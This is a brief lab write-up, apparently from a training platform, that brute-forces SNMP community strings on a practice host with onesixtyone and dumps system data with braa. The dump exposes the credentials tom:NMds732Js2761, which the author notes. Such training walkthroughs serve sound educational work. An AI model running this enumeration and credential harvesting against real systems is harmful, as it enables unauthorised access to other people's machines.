With onesixtyone we can find the community "backup"

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.231.154
Scanning 1 hosts, 3219 communities
10.129.231.154 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
```

With braa we can get useful information

```bash
10.129.231.154:62ms:.0:Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
10.129.231.154:62ms:.0:.10
10.129.231.154:62ms:.0:363135
10.129.231.154:63ms:.0:Admin <tech@inlanefreight.htb>
10.129.231.154:62ms:.0:NIXHARD
10.129.231.154:62ms:.0:Inlanefreight
10.129.231.154:62ms:.0:72
10.129.231.154:62ms:.0:12
10.129.231.154:83ms:.1:.1
10.129.231.154:49ms:.2:.1
10.129.231.154:61ms:.3:.1
10.129.231.154:61ms:.4:.1
10.129.231.154:62ms:.5:.1
10.129.231.154:61ms:.6:.49
10.129.231.154:62ms:.7:.4
10.129.231.154:63ms:.8:.50
10.129.231.154:65ms:.9:.3
10.129.231.154:65ms:.10:.92
10.129.231.154:232ms:.1:The SNMP Management Architecture MIB.
10.129.231.154:67ms:.2:The MIB for Message Processing and Dispatching.
10.129.231.154:65ms:.3:The management information definitions for the SNMP User-based Security Model.
10.129.231.154:91ms:.4:The MIB module for SNMPv2 entities
10.129.231.154:67ms:.5:View-based Access Control Model for SNMP.
10.129.231.154:65ms:.6:The MIB module for managing TCP implementations
10.129.231.154:68ms:.7:The MIB module for managing IP and ICMP implementations
10.129.231.154:68ms:.8:The MIB module for managing UDP implementations
10.129.231.154:66ms:.9:The MIB modules for managing SNMP Notification, plus filtering.
10.129.231.154:68ms:.10:The MIB module for logging SNMP Notifications.
10.129.231.154:65ms:.1:12
10.129.231.154:64ms:.2:12
10.129.231.154:46ms:.3:12
10.129.231.154:66ms:.4:12
10.129.231.154:67ms:.5:12
10.129.231.154:69ms:.6:12
10.129.231.154:66ms:.7:12
10.129.231.154:66ms:.8:12
10.129.231.154:68ms:.9:12
10.129.231.154:68ms:.10:12
10.129.231.154:66ms:.0:364405
10.129.231.154:66ms:.0:�
(
10.129.231.154:62ms:.0:393216
10.129.231.154:62ms:.0:BOOT_IMAGE=/vmlinuz-5.4.0-90-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro ipv6.disable=1 maybe-ubiquity

10.129.231.154:64ms:.0:0
10.129.231.154:62ms:.0:159
10.129.231.154:64ms:.0:0
10.129.231.154:66ms:.0:1
10.129.231.154:68ms:.80:/opt/tom-recovery.sh
10.129.231.154:65ms:.80:tom NMds732Js2761
```

In the script tom-recovery.sh we retrieve the credentials tom:NMds732Js2761